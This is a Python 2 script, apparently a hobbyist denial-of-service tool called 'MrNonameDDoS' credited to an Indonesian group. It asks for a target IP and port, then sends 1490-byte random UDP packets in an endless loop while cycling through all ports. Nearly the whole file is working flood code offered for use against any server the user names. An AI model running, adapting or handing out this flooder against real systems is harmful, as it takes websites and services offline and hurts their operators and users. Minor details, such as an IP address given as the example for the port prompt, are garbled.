import sys
import os
import time
import socket
import random

K = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("MrNonameDDoS")
print
print (U+"                                                     version:1.0")
print (K+"===========================================================")
print (R+"Author         : Mr.Noname")
print (H+"About Us       : http://panocteam.000webhostapp.com/")
print (H+"TEAM           : Pancasila anonim cyber")
print (H+"Thanks         : All Member Panoc")
print (H+"Instagram      : Panoc.Team")
print (K+"===========================================================")
print
ip = raw_input(R+"Server/IP Target : ")
port = input(H+"Port(contoh=118.98.77.81)       : ")

os.system("clear")
os.system("figlet Memulai Paket")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (R+"Mengirim %s paket ke %s port %s"%(sent,ip,port))
     if port == 65534:
       port = 1